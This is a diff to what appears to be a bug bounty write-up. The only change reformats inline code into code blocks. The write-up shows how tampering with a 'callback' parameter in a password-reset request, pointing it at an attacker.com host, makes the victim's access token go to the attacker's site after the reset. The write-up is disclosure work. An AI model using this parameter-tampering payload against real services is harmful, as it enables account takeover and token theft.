@@ -81,11 +81,15 @@ There are similar parameters that are sent when logging into another subdomain w
 
 So I tried to change the value the same as the previous request:
 
-`app=app.name&callback=https://app.redacted.com.attacker.com/callback`
+```
+app=app.name&callback=https://app.redacted.com.attacker.com/callback
+```
 
 Surprisingly, I received an email to request a password with a URL like this:
 
-`https://redacted.com/resetPassword?token=uaJfJi8hlNFCPSiKmjWO&app=app.name&callback=https://app.redacted.com.attacker.com/callback`
+```
+https://redacted.com/resetPassword?token=uaJfJi8hlNFCPSiKmjWO&app=app.name&callback=https://app.redacted.com.attacker.com/callback
+```
 
 After entering a new password, the user will automatically be redirected to the login process along with the parameters listed in the URL. Of course, because the `callback` parameter has been manipulated, the user will be directed to the attacker's website along with its access token.
 
